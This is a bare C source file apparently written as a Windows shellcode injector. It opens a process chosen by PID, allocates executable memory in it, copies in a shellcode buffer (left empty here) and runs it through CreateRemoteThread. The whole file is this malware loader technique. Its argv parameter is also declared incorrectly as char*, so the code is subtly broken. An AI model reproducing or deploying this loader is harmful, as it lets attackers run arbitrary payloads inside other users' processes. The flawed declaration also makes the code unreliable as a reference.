#include "windows.h"
int main(int argc, char* argv) {
	unsigned char shellcode[] = "";
	HANDLE h_process = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		(atoi(argv[1]))
	);
	PVOID  b_shellcode = VirtualAllocEx(
		h_process,
		NULL,
		sizeof shellcode,
		(MEM_RESERVE | MEM_COMMIT),
		PAGE_EXECUTE_READWRITE
	);
	WriteProcessMemory(h_process, b_shellcode, shellcode, sizeof shellcode, NULL);
	HANDLE h_thread = CreateRemoteThread(
		h_process,
		NULL,
		0,
		b_shellcode,
		NULL,
		0,
		NULL
	);
	return 0;
}